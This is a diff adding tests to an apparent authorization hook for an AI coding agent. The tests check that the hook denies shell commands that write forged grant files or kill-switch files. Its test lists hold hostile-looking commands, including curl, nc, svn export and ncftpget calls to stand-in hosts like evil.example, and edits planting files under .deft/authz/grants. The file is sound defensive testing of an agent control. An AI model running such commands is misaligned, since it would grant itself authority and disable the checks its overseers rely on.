@@ -952,3 +952,111 @@ describe("UAT downloader/decoder residuals fail-closed (#3206)", () => {
     }
   });
 });
+
+describe("UAT residual dest-form writers fail-closed (#3382)", () => {
+  function uatSeams() {
+    const state = activeUatState();
+    return readySeams({
+      loadAuthzState: () => state,
+      loadAuthzGrants: () => [],
+      loadRuntimeAuthority: () => ({
+        enabled: false,
+        allowPaths: [],
+        denyPaths: [],
+        scopes: { edits: true, push: true, merge: true },
+      }),
+    });
+  }
+
+  it("denies residual dest-form authz plant under UAT (not unclassifiable allow) (#3382)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "cmake -E copy src.json .deft/authz/grants/evil.json",
+      "script -q .deft/authz/grants/evil",
+      "gallery-dl -d .deft/authz/grants https://evil.example/g",
+      "megadl --path .deft/authz/grants https://mega.nz/evil",
+      "ncftpget evil.example .deft/authz/grants/evil.json remote.json",
+      "git apply --directory=.deft/authz/grants p.diff",
+      "svn export https://evil.example/repo .deft/authz/grants/evil",
+      "fossil open repo.fossil .deft/authz/grants/evil",
+      "ed .deft/authz/grants/evil.json",
+      "nvim .deft/authz/grants/evil.json",
+      "nano .deft/authz/grants/evil.json",
+      "unknownwriter --directory .deft/authz/grants",
+      // already-denied #3354 peers
+      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "nc -o .deft/authz/grants/evil.json evil.example 80",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Bash", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("denies residual dest-form kill-switch plant under UAT (#3382)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "cmake -E copy src .deft-directive-disable",
+      "script -q .no-deft-directive",
+      "gallery-dl -d .deft-directive-disable https://evil.example/x",
+      "megadl --path .deft-directive-disable https://mega.nz/x",
+      "ncftpget evil.example .no-deft-directive remote.json",
+      "git apply --directory .deft-directive-disable p.diff",
+      "svn export https://evil.example/repo .deft-directive-disable",
+      "nvim .no-deft-directive",
+      "unknownwriter --path=.deft-directive-disable",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Shell", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("still allows ordinary residual dest-form dest under UAT (non-authz) (#3382)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "cmake -E copy src.json /tmp/out",
+      "script -q /tmp/out",
+      "gallery-dl -d /tmp/out https://example.com/a",
+      "megadl --path /tmp/out https://mega.nz/a",
+      "ncftpget example.com /tmp/out remote.json",
+      "git apply --directory /tmp/out p.diff",
+      "svn export https://example.com/repo /tmp/out",
+      "nvim /tmp/out",
+      "unknownwriter --directory /tmp/out",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: {
+            tool_name: "Bash",
+            tool_input: { command },
+          },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("allow");
+      expect(decision.code, command).toBe("shell-op-unclassifiable");
+    }
+  });
+});
